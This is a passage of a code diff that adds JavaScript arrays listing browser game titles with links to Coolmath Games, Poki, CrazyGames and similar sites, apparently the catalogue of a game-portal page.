+  ["Tunnel Rush","https://www.coolmathgames.com/0-tunnel-rush"],
+  ["Slope","https://www.coolmathgames.com/0-slope"],
+  ["World's Hardest Game","https://www.coolmathgames.com/0-world-s-hardest-game"],
+  ["World's Hardest Game 2","https://www.coolmathgames.com/0-world-s-hardest-game-2"],
+  ["World's Hardest Game 3","https://www.coolmathgames.com/0-world-s-hardest-game-3"],
+  ["There Is No Game","https://www.coolmathgames.com/0-there-is-no-game"],
+  ["Big Tower Tiny Square","https://www.coolmathgames.com/0-big-tower-tiny-square"],
+  ["Big Ice Tower Tiny Square","https://www.coolmathgames.com/0-big-ice-tower-tiny-square"],
+  ["Big Neon Tower Tiny Square","https://www.coolmathgames.com/0-big-neon-tower-tiny-square"],
+  ["Factory Balls","https://www.coolmathgames.com/0-factory-balls"],
+  ["Factory Balls 2","https://www.coolmathgames.com/0-factory-balls-2"],
+  ["Factory Balls 3","https://www.coolmathgames.com/0-factory-balls-3"],
+  ["Factory Balls 4","https://www.coolmathgames.com/0-factory-balls-4"],
+  ["Bloons Tower Defense","https://www.coolmathgames.com/0-bloons-tower-defense"],
+  ["Bloons Tower Defense 2","https://www.coolmathgames.com/0-bloons-tower-defense-2"],
+  ["Bloons Tower Defense 3","https://www.coolmathgames.com/0-bloons-tower-defense-3"],
+  ["Bloons Tower Defense 4","https://www.coolmathgames.com/0-bloons-tower-defense-4"],
+  ["Bloons Tower Defense 5","https://www.coolmathgames.com/0-bloons-tower-defense-5"],
+  ["Raft Wars","https://www.coolmathgames.com/0-raft-wars"],
+  ["Raft Wars 2","https://www.coolmathgames.com/0-raft-wars-2"],
+  ["Bob the Robber","https://www.coolmathgames.com/0-bob-the-robber"],
+  ["Bob the Robber 2","https://www.coolmathgames.com/0-bob-the-robber-2"],
+  ["Bob the Robber 3","https://www.coolmathgames.com/0-bob-the-robber-3"],
+  ["Bob the Robber 4","https://www.coolmathgames.com/0-bob-the-robber-4"],
+  ["Money Movers","https://www.coolmathgames.com/0-money-movers"],
+  ["Money Movers 2","https://www.coolmathgames.com/0-money-movers-2"],
+  ["Money Movers 3","https://www.coolmathgames.com/0-money-movers-3"],
+  ["Jacksmith","https://www.coolmathgames.com/0-jacksmith"],
+  ["Cactus McCoy","https://www.coolmathgames.com/0-cactus-mccoy"],
+  ["Cactus McCoy 2","https://www.coolmathgames.com/0-cactus-mccoy-2"],
+  ["Apple Shooter","https://www.coolmathgames.com/0-apple-shooter"],
+  ["Ricochet Kills","https://www.coolmathgames.com/0-ricochet-kills"],
+  ["Johnny Upgrade","https://www.coolmathgames.com/0-johnny-upgrade"],
+  ["Jelly Truck","https://www.coolmathgames.com/0-jelly-truck"],
+  ["Wheely 9","https://www.coolmathgames.com/0-wheely-9"],
+  ["Wheely 10","https://www.coolmathgames.com/0-wheely-10"],
+  ["Wheely 11","https://www.coolmathgames.com/0-wheely-11"],
+  ["Wheely 12","https://www.coolmathgames.com/0-wheely-12"],
+  ["Gluey","https://www.coolmathgames.com/0-gluey"],
+  ["Gluey 2","https://www.coolmathgames.com/0-gluey-2"],
+  ["Civiballs","https://www.coolmathgames.com/0-civiballs"],
+  ["Civiballs 2","https://www.coolmathgames.com/0-civiballs-2"],
+  ["Meeblings","https://www.coolmathgames.com/0-meeblings"],
+  ["Meeblings 2","https://www.coolmathgames.com/0-meeblings-2"],
+  ["Balloons","https://www.coolmathgames.com/0-balloons"],
+  ["Balloons 2","https://www.coolmathgames.com/0-balloons-2"],
+  ["Hanger","https://www.coolmathgames.com/0-hanger"],
+  ["Hanger 2","https://www.coolmathgames.com/0-hanger-2"],
+  ["The Impossible Quiz","https://www.coolmathgames.com/0-the-impossible-quiz"],
+  ["The Impossible Quiz 2","https://www.coolmathgames.com/0-the-impossible-quiz-2"],
+  ["Papa's Burgeria","https://www.coolmathgames.com/0-papas-burgeria"],
+  ["Papa's Pizzeria","https://www.coolmathgames.com/0-papas-pizzeria"],
+  ["Papa's Freezeria","https://www.coolmathgames.com/0-papas-freezeria"],
+  ["Papa's Sushiria","https://www.coolmathgames.com/0-papas-sushiria"],
+  ["Papa's Bakeria","https://www.coolmathgames.com/0-papas-bakeria"],
+  ["Papa's Wingeria","https://www.coolmathgames.com/0-papas-wingeria"],
+  ["Papa's Cupcakeria","https://www.coolmathgames.com/0-papas-cupcakeria"],
+  ["Papa's Taco Mia","https://www.coolmathgames.com/0-papas-taco-mia"],
+  ["Papa's Donuteria","https://www.coolmathgames.com/0-papas-donuteria"],
+]);
+const POKI=TG([
+  ["Subway Surfers","https://poki.com/en/g/subway-surfers"],
+  ["Moto X3M","https://www.coolmathgames.com/0-moto-x3m"],
+  ["Moto X3M 2","https://poki.com/en/g/moto-x3m-2"],
+  ["Moto X3M 3","https://poki.com/en/g/moto-x3m-3"],
+  ["Moto X3M Winter","https://www.coolmathgames.com/0-moto-x3m-winter"],
+  ["Moto X3M Pool Party","https://www.coolmathgames.com/0-moto-x3m-pool-party"],
+  ["Moto X3M Spooky Land","https://www.coolmathgames.com/0-moto-x3m-spooky-land"],
+  ["Stickman Hook","https://poki.com/en/g/stickman-hook"],
+  ["Temple Run 2","https://poki.com/en/g/temple-run-2"],
+  ["Rodeo Stampede","https://poki.com/en/g/rodeo-stampede"],
+  ["Venge.io","https://poki.com/en/g/venge-io"],
+  ["Bullet Force","https://poki.com/en/g/bullet-force"],
+  ["Combat Reloaded","https://poki.com/en/g/combat-reloaded"],
+  ["Narrow One","https://poki.com/en/g/narrow-one"],
+  ["Drive Mad","https://poki.com/en/g/drive-mad"],
+  ["Drive Mad 2","https://poki.com/en/g/drive-mad-2"],
+  ["Drift Hunters","https://www.crazygames.com/game/drift-hunters"],
+  ["Madalin Stunt Cars 2","https://poki.com/en/g/madalin-stunt-cars-2"],
+  ["Smash Karts","https://poki.com/en/g/smash-karts"],
+  ["Super Star Car","https://poki.com/en/g/super-star-car"],
+  ["Highway Racer","https://poki.com/en/g/highway-racer"],
+  ["Merge Round Racers","https://poki.com/en/g/merge-round-racers"],
+  ["Monster Tracks","https://poki.com/en/g/monster-tracks"],
+  ["Blumgi Rocket","https://poki.com/en/g/blumgi-rocket"],
+  ["Blumgi Ball","https://poki.com/en/g/blumgi-ball"],
+  ["Blumgi Slime","https://poki.com/en/g/blumgi-slime"],
+  ["Blumgi Castle","https://poki.com/en/g/blumgi-castle"],
+  ["Blumgi Bloom","https://poki.com/en/g/blumgi-bloom"],
+  ["Blumgi Racers","https://poki.com/en/g/blumgi-racers"],
+  ["Dreadhead Parkour","https://poki.com/en/g/dreadhead-parkour"],
+  ["Parkour Race","https://poki.com/en/g/parkour-race"],
+  ["Ninja Parkour","https://poki.com/en/g/ninja-parkour"],
+  ["Vex 3","https://poki.com/en/g/vex-3"],
+  ["Vex 4","https://poki.com/en/g/vex-4"],
+  ["Vex 5","https://poki.com/en/g/vex-5"],
+  ["Vex 6","https://poki.com/en/g/vex-6"],
+  ["Vex 7","https://poki.com/en/g/vex-7"],
+  ["Vex 8","https://poki.com/en/g/vex-8"],
+  ["Level Devil","https://poki.com/en/g/level-devil"],
+  ["Poor Bunny","https://poki.com/en/g/poor-bunny"],
+  ["Tag 2 3 4 Players","https://poki.com/en/g/tag-2-3-4-players"],
+  ["Soccer Skills World Cup","https://poki.com/en/g/soccer-skills-world-cup"],
+  ["Basketball Stars","https://poki.com/en/g/basketball-stars"],
+  ["Basketball Legends","https://poki.com/en/g/basketball-legends"],
+  ["Football Masters","https://poki.com/en/g/football-masters"],
+  ["Penalty Shooters 2","https://poki.com/en/g/penalty-shooters-2"],
+  ["Tennis Masters","https://poki.com/en/g/tennis-masters"],
+  ["Golf Champions","https://poki.com/en/g/golf-champions"],
+  ["Mini Golf Club","https://poki.com/en/g/mini-golf-club"],
+  ["Cricket Hero","https://poki.com/en/g/cricket-hero"],
+  ["Baseball Pro","https://poki.com/en/g/baseball-pro"],
+  ["Stick Merge","https://poki.com/en/g/stick-merge"],
+  ["Stick Defenders","https://poki.com/en/g/stick-defenders"],
+  ["Stickman Climb","https://poki.com/en/g/stickman-climb"],
+  ["Stickman Bike","https://poki.com/en/g/stickman-bike"],
+  ["Stickman Dragon Fight","https://poki.com/en/g/stickman-dragon-fight"],
+  ["Stickman Battle Fight Warriors","https://poki.com/en/g/stickman-battle-fight-warriors"],
+  ["Stickman Parkour Skyland","https://poki.com/en/g/stickman-parkour-skyland"],
+  ["Duo Survival","https://poki.com/en/g/duo-survival"],
+  ["Duo Survival 2","https://poki.com/en/g/duo-survival-2"],
+  ["Duo Survival 3","https://poki.com/en/g/duo-survival-3"],
+  ["Fireboy and Watergirl","https://poki.com/en/g/fireboy-and-watergirl"],
+  ["Fireboy and Watergirl 2","https://poki.com/en/g/fireboy-and-watergirl-2"],
+  ["Fireboy and Watergirl 3","https://poki.com/en/g/fireboy-and-watergirl-3"],
+  ["Fireboy and Watergirl 4","https://poki.com/en/g/fireboy-and-watergirl-4"],
+  ["Fireboy and Watergirl 5","https://poki.com/en/g/fireboy-and-watergirl-5"],
+  ["Fireboy and Watergirl 6","https://poki.com/en/g/fireboy-and-watergirl-6"],
+  ["Duo Vikings","https://poki.com/en/g/duo-vikings"],
+  ["Duo Vikings 2","https://poki.com/en/g/duo-vikings-2"],
+  ["Duo Vikings 3","https://poki.com/en/g/duo-vikings-3"],
+  ["House of Hazards","https://poki.com/en/g/house-of-hazards"],
+  ["Getaway Shootout","https://poki.com/en/g/getaway-shootout"],
+  ["Rooftop Snipers","https://poki.com/en/g/rooftop-snipers"],
+  ["G-Switch 3","https://poki.com/en/g/g-switch-3"],
+  ["Big Tower Tiny Square","https://poki.com/en/g/big-tower-tiny-square"],
+  ["Big Ice Tower Tiny Square","https://poki.com/en/g/big-ice-tower-tiny-square"],
+  ["Big Neon Tower Tiny Square","https://poki.com/en/g/big-neon-tower-tiny-square"],
+  ["Bob the Robber","https://poki.com/en/g/bob-the-robber"],
+  ["Bob the Robber 2","https://poki.com/en/g/bob-the-robber-2"],
+  ["Bob the Robber 3","https://poki.com/en/g/bob-the-robber-3"],
+  ["Bob the Robber 4","https://poki.com/en/g/bob-the-robber-4"],
+  ["Money Movers","https://poki.com/en/g/money-movers"],
+  ["Money Movers 2","https://poki.com/en/g/money-movers-2"],
+  ["Money Movers 3","https://poki.com/en/g/money-movers-3"],
+  ["Wheely","https://poki.com/en/g/wheely"],
+  ["Wheely 2","https://poki.com/en/g/wheely-2"],
+  ["Wheely 3","https://poki.com/en/g/wheely-3"],
+  ["Wheely 4","https://poki.com/en/g/wheely-4"],
+  ["Wheely 5","https://poki.com/en/g/wheely-5"],
+  ["Wheely 6","https://poki.com/en/g/wheely-6"],
+  ["Wheely 7","https://poki.com/en/g/wheely-7"],
+  ["Wheely 8","https://poki.com/en/g/wheely-8"],
+  ["Cut the Rope","https://www.coolmathgames.com/0-cut-the-rope"],
+  ["Cut the Rope 2","https://poki.com/en/g/cut-the-rope-2"],
+  ["Cut the Rope Time Travel","https://poki.com/en/g/cut-the-rope-time-travel"],
+  ["Cut the Rope Experiments","https://poki.com/en/g/cut-the-rope-experiments"],
+  ["Om Nom Run","https://poki.com/en/g/om-nom-run"],
+  ["Bloxorz","https://www.coolmathgames.com/0-bloxorz"],
+  ["2048","https://poki.com/en/g/2048"],
+  ["Word City Crossed","https://poki.com/en/g/word-city-crossed"],
+  ["Words Search Classic","https://poki.com/en/g/words-search-classic"],
+  ["Nonogram","https://poki.com/en/g/nonogram"],
+  ["Sudoku","https://poki.com/en/g/sudoku"],
+  ["Mahjong","https://poki.com/en/g/mahjong"],
+  ["Solitaire","https://poki.com/en/g/solitaire"],
+  ["Chess","https://poki.com/en/g/chess"],
+  ["Checkers","https://poki.com/en/g/checkers"],
+  ["Mastermind","https://poki.com/en/g/mastermind"],
+  ["Lines to Fill","https://poki.com/en/g/lines-to-fill"],
+  ["Color Tunnel","https://poki.com/en/g/color-tunnel"],
+  ["Tunnel Rush","https://poki.com/en/g/tunnel-rush"],
+  ["Slope","https://poki.com/en/g/slope"],
+  ["Run 3","https://poki.com/en/g/run-3"],
+  ["Run","https://poki.com/en/g/run"],
+  ["Run 2","https://poki.com/en/g/run-2"],
+  ["Jetpack Joyride","https://poki.com/en/g/jetpack-joyride"],
+  ["Fruit Ninja","https://poki.com/en/g/fruit-ninja"],
+  ["Crossy Road","https://poki.com/en/g/crossy-road"],
+  ["Flappy Bird","https://poki.com/en/g/flappy-bird"],
+  ["Stack","https://poki.com/en/g/stack"],
+  ["Helix Jump","https://poki.com/en/g/helix-jump"],
+  ["Bottle Flip 3D","https://poki.com/en/g/bottle-flip-3d"],
+  ["Crazy Roll 3D","https://poki.com/en/g/crazy-roll-3d"],
+  ["Paper.io 2","https://poki.com/en/g/paper-io-2"],
+  ["Hole.io","https://poki.com/en/g/hole-io"],
+  ["Crowd City","https://poki.com/en/g/crowd-city"],
+  ["Aquapark.io","https://poki.com/en/g/aquapark-io"],
+  ["Slither.io","https://poki.com/en/g/slither-io"],
+  ["Agar.io","https://poki.com/en/g/agar-io"],
+  ["Zombs Royale","https://poki.com/en/g/zombs-royale"],
+  ["Krunker.io","https://poki.com/en/g/krunker-io"],
+  ["Shell Shockers","https://poki.com/en/g/shell-shockers"],
+  ["Bloxd.io","https://poki.com/en/g/bloxd-io"],
+  ["Minecraft Classic","https://poki.com/en/g/minecraft-classic"],
+  ["Mine Clone","https://poki.com/en/g/mine-clone"],
+  ["Noob Miner","https://poki.com/en/g/noob-miner"],
+  ["Zombie Mission","https://poki.com/en/g/zombie-mission"],
+  ["Zombie Mission 2","https://poki.com/en/g/zombie-mission-2"],
+  ["Zombie Mission 3","https://poki.com/en/g/zombie-mission-3"],
+  ["Zombie Mission 4","https://poki.com/en/g/zombie-mission-4"],
+  ["Zombie Mission 5","https://poki.com/en/g/zombie-mission-5"],
+  ["Zombie Mission 6","https://poki.com/en/g/zombie-mission-6"],
+  ["Zombie Mission 7","https://poki.com/en/g/zombie-mission-7"],
+  ["Zombie Mission 8","https://poki.com/en/g/zombie-mission-8"],
+  ["Zombie Mission 9","https://poki.com/en/g/zombie-mission-9"],
+  ["Zombie Mission 10","https://poki.com/en/g/zombie-mission-10"],
+  ["Zombie Mission 11","https://poki.com/en/g/zombie-mission-11"],
+  ["Zombie Mission 12","https://poki.com/en/g/zombie-mission-12"],
+  ["Poki Hero 1","https://poki.com/en/g/hero-1"],
+  ["Paper.io","https://poki.com/en/g/paper-io"],
+]);
+const EXTRA=TG([
+  ["2048","https://www.crazygames.com/game/2048"],
+  ["9007199254740992","https://www.crazygames.com/game/9007199254740992"],
+  ["10x10","https://www.crazygames.com/game/10x10"],
+  ["1010 Deluxe","https://www.crazygames.com/game/1010-deluxe"],
+  ["Wordle","https://www.crazygames.com/game/wordle"],
+  ["Dordle","https://www.crazygames.com/game/dordle"],
+  ["Quordle","https://www.crazygames.com/game/quordle"],
+  ["Octordle","https://www.crazygames.com/game/octordle"],
+  ["Waffle","https://www.crazygames.com/game/waffle"],
+  ["Nerdle","https://www.crazygames.com/game/nerdle"],
+  ["Globle","https://www.crazygames.com/game/globle"],
+  ["Worldle","https://www.crazygames.com/game/worldle"],
+  ["WorldGuessr","https://www.crazygames.com/game/worldguessr"],
+  ["GeoGuessr","https://www.crazygames.com/game/geoguessr"],
+  ["City Guesser","https://www.crazygames.com/game/city-guesser"],
+  ["Minesweeper","https://www.crazygames.com/game/minesweeper"],
+  ["Solitaire","https://www.crazygames.com/game/solitaire"],
+  ["Spider Solitaire","https://www.crazygames.com/game/spider-solitaire"],
+  ["Freecell","https://www.crazygames.com/game/freecell"],
+  ["Mahjong","https://www.crazygames.com/game/mahjong"],
+  ["Sudoku","https://www.crazygames.com/game/sudoku"],
+  ["Chess","https://www.crazygames.com/game/chess"],
+  ["Checkers","https://www.crazygames.com/game/checkers"],
+  ["Connect 4","https://www.crazygames.com/game/connect-4"],
+  ["Reversi","https://www.crazygames.com/game/reversi"],
+  ["Battleship","https://www.crazygames.com/game/battleship"],
+  ["Codenames","https://www.crazygames.com/game/codenames"],
+  ["Skribbl.io","https://www.crazygames.com/game/skribbl-io"],
+  ["Gartic Phone","https://www.crazygames.com/game/gartic-phone"],
+  ["Gartic.io","https://www.crazygames.com/game/gartic-io"],
+  ["Drawize","https://www.crazygames.com/game/drawize"],
+  ["Colonist.io","https://www.crazygames.com/game/colonist-io"],
+  ["Board Game Online","https://www.crazygames.com/game/board-game-online"],
+  ["Tetris","https://www.crazygames.com/game/tetris"],
+  ["Tetr.io","https://www.crazygames.com/game/tetr-io"],
+  ["Jstris","https://www.crazygames.com/game/jstris"],
+  ["Puyo Puyo","https://www.crazygames.com/game/puyo-puyo"],
+  ["Hextris","https://www.crazygames.com/game/hextris"],
+  ["2048 Cupcakes","https://www.crazygames.com/game/2048-cupcakes"],
+  ["2048 Doge","https://www.crazygames.com/game/2048-doge"],
+  ["2048 Taylor Swift","https://www.crazygames.com/game/2048-taylor-swift"],
+  ["Little Alchemy","https://www.crazygames.com/game/little-alchemy"],
+  ["Little Alchemy 2","https://www.crazygames.com/game/little-alchemy-2"],
+  ["Doodle God","https://www.crazygames.com/game/doodle-god"],
+  ["Doodle Devil","https://www.crazygames.com/game/doodle-devil"],
+  ["The Impossible Quiz","https://www.crazygames.com/game/the-impossible-quiz"],
+  ["The Impossible Quiz 2","https://www.crazygames.com/game/the-impossible-quiz-2"],
+  ["Impossible Quizmas","https://www.crazygames.com/game/impossible-quizmas"],
+  ["Portal Flash","https://www.numuki.com/game/portal-the-flash-version/"],
+  ["Bloxorz","https://www.coolmathgames.com/0-bloxorz"],
+  ["Cut the Rope","https://www.coolmathgames.com/0-cut-the-rope"],
+  ["Cut the Rope 2","https://www.crazygames.com/game/cut-the-rope-2"],
+  ["Cut the Rope Time Travel","https://www.crazygames.com/game/cut-the-rope-time-travel"],
+  ["Cut the Rope Experiments","https://www.crazygames.com/game/cut-the-rope-experiments"],
+  ["IQ Ball","https://www.coolmathgames.com/0-iq-ball"],
+  ["IQ Ball 2","https://www.crazygames.com/game/iq-ball-2"],
+  ["Wheely","https://www.crazygames.com/game/wheely"],
+  ["Wheely 2","https://www.crazygames.com/game/wheely-2"],
+  ["Wheely 3","https://www.crazygames.com/game/wheely-3"],
+  ["Wheely 4","https://www.crazygames.com/game/wheely-4"],
+  ["Wheely 5","https://www.crazygames.com/game/wheely-5"],
+  ["Wheely 6","https://www.crazygames.com/game/wheely-6"],
+  ["Wheely 7","https://www.crazygames.com/game/wheely-7"],
+  ["Wheely 8","https://www.crazygames.com/game/wheely-8"],
+  ["Snail Bob","https://www.crazygames.com/game/snail-bob"],
+  ["Snail Bob 2","https://www.crazygames.com/game/snail-bob-2"],
+  ["Snail Bob 3","https://www.crazygames.com/game/snail-bob-3"],
+  ["Snail Bob 4","https://www.crazygames.com/game/snail-bob-4"],
+  ["Snail Bob 5","https://www.crazygames.com/game/snail-bob-5"],
+  ["Snail Bob 6","https://www.crazygames.com/game/snail-bob-6"],
+  ["Snail Bob 7","https://www.crazygames.com/game/snail-bob-7"],
+  ["Snail Bob 8","https://www.crazygames.com/game/snail-bob-8"],
+  ["Factory Balls","https://www.crazygames.com/game/factory-balls"],
+  ["Factory Balls 2","https://www.crazygames.com/game/factory-balls-2"],
+  ["Factory Balls 3","https://www.crazygames.com/game/factory-balls-3"],
+  ["Factory Balls 4","https://www.crazygames.com/game/factory-balls-4"],
+  ["Sugar Sugar","https://www.crazygames.com/game/sugar-sugar"],
+  ["Sugar Sugar 2","https://www.crazygames.com/game/sugar-sugar-2"],
+  ["Sugar Sugar 3","https://www.crazygames.com/game/sugar-sugar-3"],
+  ["Red Remover","https://www.crazygames.com/game/red-remover"],
+  ["Red Remover 2","https://www.crazygames.com/game/red-remover-2"],
+  ["Cover Orange","https://www.crazygames.com/game/cover-orange"],
+  ["Cover Orange 2","https://www.crazygames.com/game/cover-orange-2"],
+  ["Cover Orange Journey","https://www.crazygames.com/game/cover-orange-journey"],
+  ["Wake Up the Box","https://www.crazygames.com/game/wake-up-the-box"],
+  ["Wake Up the Box 2","https://www.crazygames.com/game/wake-up-the-box-2"],
+  ["Wake Up the Box 3","https://www.crazygames.com/game/wake-up-the-box-3"],
+  ["Wake Up the Box 4","https://www.crazygames.com/game/wake-up-the-box-4"],
+  ["Civiballs","https://www.crazygames.com/game/civiballs"],
+  ["Civiballs 2","https://www.crazygames.com/game/civiballs-2"],
+  ["Civiballs Xmas","https://www.crazygames.com/game/civiballs-xmas"],
+  ["Meeblings","https://www.crazygames.com/game/meeblings"],
+  ["Meeblings 2","https://www.crazygames.com/game/meeblings-2"],
+  ["Grow Island","https://www.crazygames.com/game/grow-island"],
+  ["Grow Cube","https://www.crazygames.com/game/grow-cube"],
+  ["Grow RPG","https://www.crazygames.com/game/grow-rpg"],
+  ["Grow Valley","https://www.crazygames.com/game/grow-valley"],
+  ["Grow Tower","https://www.crazygames.com/game/grow-tower"],
+  ["Grow Nano","https://www.crazygames.com/game/grow-nano"],
+  ["This Is the Only Level","https://www.crazygames.com/game/this-is-the-only-level"],
+  ["This Is the Only Level 2","https://www.crazygames.com/game/this-is-the-only-level-2"],
+  ["This Is the Only Level 3","https://www.crazygames.com/game/this-is-the-only-level-3"],
+  ["There Is No Game","https://www.crazygames.com/game/there-is-no-game"],
+  ["Achievement Unlocked","https://www.crazygames.com/game/achievement-unlocked"],
+  ["Achievement Unlocked 2","https://www.crazygames.com/game/achievement-unlocked-2"],
+  ["Achievement Unlocked 3","https://www.crazygames.com/game/achievement-unlocked-3"],
+  ["Duck Life","https://www.crazygames.com/game/duck-life"],
+  ["Duck Life 2","https://www.crazygames.com/game/duck-life-2"],
+  ["Duck Life 3","https://www.crazygames.com/game/duck-life-3"],
+  ["Duck Life 4","https://www.crazygames.com/game/duck-life-4"],
+  ["Duck Life Space","https://www.crazygames.com/game/duck-life-space"],
+  ["Tiny Fishing","https://www.crazygames.com/game/tiny-fishing"],
+  ["Cookie Clicker","https://www.crazygames.com/game/cookie-clicker"],
+  ["Clicker Heroes","https://www.crazygames.com/game/clicker-heroes"],
+  ["Doge Miner","https://www.crazygames.com/game/doge-miner"],
+  ["Doge Miner 2","https://www.crazygames.com/game/doge-miner-2"],
+  ["Adventure Capitalist","https://www.crazygames.com/game/adventure-capitalist"],
+  ["Realm Grinder","https://www.crazygames.com/game/realm-grinder"],
+  ["Paperclips","https://www.crazygames.com/game/paperclips"],
+  ["Universal Paperclips","https://www.crazygames.com/game/universal-paperclips"],
+  ["Candy Box","https://www.crazygames.com/game/candy-box"],
+  ["Candy Box 2","https://www.crazygames.com/game/candy-box-2"],
+  ["A Dark Room","https://www.crazygames.com/game/a-dark-room"],
+  ["Cookie Clicker 2","https://www.crazygames.com/game/cookie-clicker-2"],
+  ["Idle Breakout","https://www.crazygames.com/game/idle-breakout"],
+  ["Idle Dice","https://www.crazygames.com/game/idle-dice"],
+  ["Antimatter Dimensions","https://www.crazygames.com/game/antimatter-dimensions"],
+  ["Melvor Idle","https://www.crazygames.com/game/melvor-idle"],
+  ["Eel Slap","https://www.crazygames.com/game/eel-slap"],
+  ["Pointer Pointer","https://www.crazygames.com/game/pointer-pointer"],
+  ["Patatap","https://www.crazygames.com/game/patatap"],
+  ["Find the Invisible Cow","https://www.crazygames.com/game/find-the-invisible-cow"],
+  ["Neal.fun","https://www.crazygames.com/game/neal-fun"],
+  ["The Password Game","https://www.crazygames.com/game/the-password-game"],
+  ["Infinite Craft","https://www.crazygames.com/game/infinite-craft"],
+  ["Absurd Trolley Problems","https://www.crazygames.com/game/absurd-trolley-problems"],
+  ["Spend Bill Gates Money","https://www.crazygames.com/game/spend-bill-gates-money"],
+  ["Draw a Perfect Circle","https://www.crazygames.com/game/draw-a-perfect-circle"],
+  ["Sandspiel","https://www.crazygames.com/game/sandspiel"],
+  ["Powder Game","https://www.crazygames.com/game/powder-game"],
+  ["Line Rider","https://www.crazygames.com/game/line-rider"],
+  ["Canvas Rider","https://www.crazygames.com/game/canvas-rider"],
+  ["Happy Wheels","https://www.crazygames.com/game/happy-wheels"],
+  ["Flappy Bird","https://www.crazygames.com/game/flappy-bird"],
+  ["Chrome Dino","https://www.crazygames.com/game/chrome-dino"],
+  ["Google Snake","https://www.crazygames.com/game/google-snake"],
+  ["Pacman","https://www.crazygames.com/game/pacman"],
+  ["Ms Pacman","https://www.crazygames.com/game/ms-pacman"],
+  ["Space Invaders","https://www.crazygames.com/game/space-invaders"],
+  ["Asteroids","https://www.crazygames.com/game/asteroids"],
+]);
+const FIGHTING=[
+  {"n": "Street Fighter 2", "u": "https://www.crazygames.com/game/street-fighter-2"},
+  {"n": "Street Fighter 2 Champion Edition", "u": "https://www.crazygames.com/game/street-fighter-2-champion-edition"},
+  {"n": "Street Fighter Alpha", "u": "https://www.crazygames.com/game/street-fighter-alpha"},
+  {"n": "Street Fighter Alpha 2", "u": "https://www.crazygames.com/game/street-fighter-alpha-2"},
+  {"n": "Street Fighter Alpha 3", "u": "https://www.crazygames.com/game/street-fighter-alpha-3"},
+  {"n": "Street Fighter Flash", "u": "https://www.crazygames.com/game/street-fighter-flash"},
+  {"n": "Street Fighter vs Mega Man", "u": "https://www.crazygames.com/game/street-fighter-vs-mega-man"},
+  {"n": "Final Fight", "u": "https://www.crazygames.com/game/final-fight"},
+  {"n": "Final Fight 2", "u": "https://www.crazygames.com/game/final-fight-2"},
+  {"n": "Final Fight 3", "u": "https://www.crazygames.com/game/final-fight-3"},
+  {"n": "Mortal Kombat", "u": "https://www.crazygames.com/game/mortal-kombat"},
+  {"n": "Mortal Kombat 2", "u": "https://www.crazygames.com/game/mortal-kombat-2"},
+  {"n": "Mortal Kombat 3", "u": "https://www.crazygames.com/game/mortal-kombat-3"},
+  {"n": "Mortal Kombat 4", "u": "https://www.crazygames.com/game/mortal-kombat-4"},
+  {"n": "Ultimate Mortal Kombat 3", "u": "https://www.crazygames.com/game/ultimate-mortal-kombat-3"},
+  {"n": "Mortal Kombat Karnage", "u": "https://www.crazygames.com/game/mortal-kombat-karnage"},
+  {"n": "Mortal Kombat Trilogy", "u": "https://www.crazygames.com/game/mortal-kombat-trilogy"},
+  {"n": "Mortal Kombat Project", "u": "https://www.crazygames.com/game/mortal-kombat-project"},
+  {"n": "Super Smash Flash", "u": "https://www.crazygames.com/game/super-smash-flash"},
+  {"n": "Super Smash Flash 2", "u": "https://www.supersmashflash.com/play/ssf2/"},
+  {"n": "Super Smash Flash 2 Demo", "u": "https://www.crazygames.com/game/super-smash-flash-2-demo"},
+  {"n": "Super Smash Flash 2 Beta", "u": "https://www.crazygames.com/game/super-smash-flash-2-beta"},
+  {"n": "Super Smash Flash 2 Classic", "u": "https://www.crazygames.com/game/super-smash-flash-2-classic"},
+  {"n": "Super Smash Flash 2 v0.9", "u": "https://www.crazygames.com/game/super-smash-flash-2-v0-9"},
+  {"n": "Super Smash Flash 2 v1.0", "u": "https://www.crazygames.com/game/super-smash-flash-2-v1-0"},
+  {"n": "Super Smash Flash 2 v1.1", "u": "https://www.crazygames.com/game/super-smash-flash-2-v1-1"},
+  {"n": "Super Smash Flash 2 v1.2", "u": "https://www.crazygames.com/game/super-smash-flash-2-v1-2"},
+  {"n": "Super Smash Flash 2 Unblocked", "u": "https://www.crazygames.com/game/super-smash-flash-2-unblocked"},
+  {"n": "Dragon Ball Fierce Fighting", "u": "https://www.crazygames.com/game/dragon-ball-fierce-fighting"},
+  {"n": "Dragon Ball Fierce Fighting 2", "u": "https://www.crazygames.com/game/dragon-ball-fierce-fighting-2"},
+  {"n": "Dragon Ball Fierce Fighting 3", "u": "https://www.crazygames.com/game/dragon-ball-fierce-fighting-3"},
+  {"n": "Dragon Ball Z Devolution", "u": "https://www.crazygames.com/game/dragon-ball-z-devolution"},
+  {"n": "Dragon Ball Z Tribute", "u": "https://www.crazygames.com/game/dragon-ball-z-tribute"},
+  {"n": "Dragon Ball Fighting", "u": "https://www.crazygames.com/game/dragon-ball-fighting"},
+  {"n": "Anime Battle", "u": "https://www.crazygames.com/game/anime-battle"},
+  {"n": "Anime Battle 2", "u": "https://www.crazygames.com/game/anime-battle-2"},
+  {"n": "Anime Battle 3", "u": "https://www.crazygames.com/game/anime-battle-3"},
+  {"n": "Bleach vs Naruto", "u": "https://www.crazygames.com/game/bleach-vs-naruto"},
+  {"n": "Bleach vs Naruto 2", "u": "https://www.crazygames.com/game/bleach-vs-naruto-2"},
+  {"n": "Bleach vs Naruto 3", "u": "https://www.crazygames.com/game/bleach-vs-naruto-3"},
+  {"n": "Bleach vs Naruto 4", "u": "https://www.crazygames.com/game/bleach-vs-naruto-4"},
+  {"n": "Naruto Battle Grounds", "u": "https://www.crazygames.com/game/naruto-battle-grounds"},
+  {"n": "Naruto Fighting CR Kakashi", "u": "https://www.crazygames.com/game/naruto-fighting-cr-kakashi"},
+  {"n": "One Piece Fighting", "u": "https://www.crazygames.com/game/one-piece-fighting"},
+  {"n": "One Piece vs Naruto", "u": "https://www.crazygames.com/game/one-piece-vs-naruto"},
+  {"n": "Fairy Tail vs One Piece", "u": "https://www.crazygames.com/game/fairy-tail-vs-one-piece"},
+  {"n": "Fairy Tail vs One Piece 2", "u": "https://www.crazygames.com/game/fairy-tail-vs-one-piece-2"},
+  {"n": "Fairy Tail vs One Piece 3", "u": "https://www.crazygames.com/game/fairy-tail-vs-one-piece-3"},
+  {"n": "Comic Stars Fighting", "u": "https://www.crazygames.com/game/comic-stars-fighting"},
+  {"n": "Comic Stars Fighting 2", "u": "https://www.crazygames.com/game/comic-stars-fighting-2"},
+  {"n": "King of Fighters Wing", "u": "https://www.crazygames.com/game/king-of-fighters-wing"},
